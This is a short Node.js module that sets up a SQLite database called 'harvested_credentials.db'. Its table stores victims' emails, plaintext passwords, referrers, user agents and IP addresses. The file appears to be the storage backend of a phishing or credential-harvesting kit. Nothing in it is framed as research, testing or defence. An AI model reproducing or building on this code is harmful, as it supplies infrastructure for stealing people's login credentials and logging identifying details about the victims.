const Database = require('better-sqlite3');
const path = require('path');

const dbPath = path.join(__dirname, 'harvested_credentials.db');
const db = new Database(dbPath);

// Create table on first run
db.exec(`
  CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    referrer TEXT,
    user_agent TEXT,
    ip_address TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

module.exports = db;
